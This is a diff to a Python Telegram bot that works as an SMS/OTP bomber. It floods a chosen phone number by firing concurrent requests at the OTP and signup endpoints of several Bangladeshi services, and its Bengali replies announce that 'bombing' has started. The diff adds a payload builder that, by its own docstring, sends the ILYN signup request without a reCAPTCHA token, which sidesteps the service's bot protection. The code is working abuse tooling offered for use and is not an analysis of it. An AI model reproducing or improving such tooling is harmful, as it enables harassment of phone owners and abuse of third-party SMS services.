@@ -1,3 +1,6 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
 import os
 import re
 import json
@@ -8,6 +11,7 @@ from pathlib import Path
 from fastapi import FastAPI
 from fastapi.responses import HTMLResponse, JSONResponse
 import aiohttp
+import logging
 from telegram import (
     ReplyKeyboardMarkup,
     KeyboardButton,
@@ -29,9 +33,28 @@ API_URL = "https://da-api.robi.com.bd/da-nll/otp/send"
 HEADERS = {"Content-Type": "application/json"}
 HISTORY_FILE = Path("history.json")
 CONCURRENCY = 150
-WAKEUP_URL = os.getenv("WAKEUP_URL", "https://rk-syatem.onrender.com")
+WAKEUP_URL = os.getenv("WAKEUP_URL", "https://rk-system.onrender.com")
+
+# ---------------- LOGGING ----------------
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger("rkbot")
 
 # ---------------- EXTRA APIS ----------------
+ILYN_URL = "https://api.ilyn.global/auth/signup"
+BOUNDARY = "----WebKitFormBoundaryRKSTAR12345"
+
+def make_ilyn_payload(phone: str):
+    """
+    Multipart ফরম্যাটে ILYN signup রিকোয়েস্ট তৈরি করবে (recaptcha ছাড়াই)
+    """
+    return (
+        f"--{BOUNDARY}\r\n"
+        f'Content-Disposition: form-data; name="phone"\r\n\r\n{{"code":"BD","number":"{phone}"}}\r\n'
+        f"--{BOUNDARY}\r\n"
+        f'Content-Disposition: form-data; name="provider"\r\n\r\nsms\r\n'
+        f"--{BOUNDARY}--"
+    )
+
 EXTRA_APIS = [
     {
         "url": "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0",
@@ -42,13 +65,14 @@ EXTRA_APIS = [
         "payload": lambda number: {"phone": f"88{number}"}
     },
     {
-        "url": "https://api.ilyn.global/auth/signup-account-verification",
+        "url": ILYN_URL,
         "headers": {
             "appId": "1",
             "appCode": "ilyn-bd",
-            "Content-Type": "multipart/form-data",
+            "Connection": "keep-alive",
+            "Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
         },
-        "payload": lambda number: f'------WebKitFormBoundary1MwG6OYBsBAmXqyx\r\nContent-Disposition: form-data; name="recaptchaToken"\r\n\r\nTOKEN_HERE\r\n------WebKitFormBoundary1MwG6OYBsBAmXqyx\r\nContent-Disposition: form-data; name="phone"\r\n\r\n{{"code":"BD","number":"{number}"}}\r\n------WebKitFormBoundary1MwG6OYBsBAmXqyx\r\nContent-Disposition: form-data; name="provider"\r\n\r\nsms\r\n------WebKitFormBoundary1MwG6OYBsBAmXqyx--'
+        "payload": lambda number: make_ilyn_payload(number)
     }
 ]
 
@@ -86,12 +110,12 @@ async def memory_cleanup():
         try:
             mem_usage = process.memory_info().rss / 1024 / 1024
             if mem_usage > 450:
-                print(f"⚠️ Memory high ({mem_usage:.2f} MB). Running cleanup...")
+                logger.warning(f"⚠️ Memory high ({mem_usage:.2f} MB). Running cleanup...")
                 gc.collect()
                 await asyncio.sleep(3)
             await asyncio.sleep(10)
         except Exception as e:
-            print(f"[MemoryCleanup Error] {e}")
+            logger.error(f"[MemoryCleanup Error] {e}")
             await asyncio.sleep(10)
 
 # ------------- REQUEST SENDER ------------------
@@ -109,7 +133,12 @@ async def send_requests(number: str, stop_event: asyncio.Event, stats: RequestSt
         async def fire_api(url, headers, payload):
             async with sem:
                 try:
-                    async with session.post(url, json=payload if isinstance(payload, dict) else None, data=payload if isinstance(payload, str) else None, headers=headers) as r:
+                    async with session.post(
+                        url,
+                        json=payload if isinstance(payload, dict) else None,
+                        data=payload if isinstance(payload, str) else None,
+                        headers=headers
+                    ) as r:
                         text = await r.text()
                         stats.total += 1
                         if '"status":"SUCCESSFUL"' in text or '"success":true' in text:
@@ -122,9 +151,7 @@ async def send_requests(number: str, stop_event: asyncio.Event, stats: RequestSt
         for _ in range(amount):
             if stop_event.is_set():
                 break
-            # Main API
             await fire_api(API_URL, HEADERS, {"msisdn": number})
-            # Extra APIs
             for api in EXTRA_APIS:
                 payload = api["payload"](number)
                 await fire_api(api["url"], api["headers"], payload)
@@ -178,9 +205,8 @@ async def callback_handler(update, context: ContextTypes.DEFAULT_TYPE):
     data = query.data
 
     if data.startswith("start|"):
-        parts = data.split("|")
-        number = parts[1]
-        amount = int(parts[2]) if len(parts) > 2 else 10
+        _, number, amount = data.split("|")
+        amount = int(amount)
 
         if chat_id not in running_jobs:
             running_jobs[chat_id] = []
@@ -204,7 +230,7 @@ async def callback_handler(update, context: ContextTypes.DEFAULT_TYPE):
             "amount": amount
         })
         await query.message.reply_text(
-            f"✅ এই নম্বরে {number} বোম্বিং শুরু হয়েছে।\n📦 মোট রিকোয়েস্ট: {amount}\n👉 বন্ধ করতে /stop {number}\n👉 চেক করতে /check"
+            f"✅ {number} নম্বরে বোম্বিং শুরু হয়েছে।\n📦 মোট রিকোয়েস্ট: {amount}\n👉 বন্ধ করতে /stop {number}\n👉 চেক করতে /check"
         )
 
 async def stop(update, context: ContextTypes.DEFAULT_TYPE):
@@ -235,7 +261,6 @@ async def stop(update, context: ContextTypes.DEFAULT_TYPE):
 
 async def check(update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = str(update.effective_chat.id)
-
     if chat_id not in running_jobs or not running_jobs[chat_id]:
         await update.message.reply_text("📭 এখন কোনো বোম্বিং রানিং নেই।")
         return
@@ -244,7 +269,7 @@ async def check(update, context: ContextTypes.DEFAULT_TYPE):
     for job in running_jobs[chat_id]:
         stats = job["stats"]
         text_lines.append(
-            f"নম্বর: {job['number']}\n📦 Planned: {job.get('amount', 'N/A')}\n✅ Success: {stats.success}\n❌ Dismiss: {stats.dismiss}\n📊 Total: {stats.total}"
+            f"নম্বর: {job['number']}\n📦 Planned: {job['amount']}\n✅ Success: {stats.success}\n❌ Dismiss: {stats.dismiss}\n📊 Total: {stats.total}"
         )
     await update.message.reply_text("📡 Live STATS:\n\n" + "\n\n".join(text_lines))
 
@@ -260,19 +285,16 @@ async def history_command(update, context: ContextTypes.DEFAULT_TYPE):
 # ------------- TELEGRAM LOOP ------------------
 async def telegram_bot():
     app_bot = ApplicationBuilder().token(BOT_TOKEN).build()
-
     app_bot.add_handler(CommandHandler("start", start))
     app_bot.add_handler(CommandHandler("stop", stop))
     app_bot.add_handler(CommandHandler("check", check))
     app_bot.add_handler(CommandHandler("history", history_command))
     app_bot.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), mini_button))
     app_bot.add_handler(CallbackQueryHandler(callback_handler))
-
     await app_bot.initialize()
     await app_bot.start()
     await app_bot.updater.start_polling()
     print("✅ Your Telegram bot is Started")
-
     while True:
         await asyncio.sleep(3600)
 
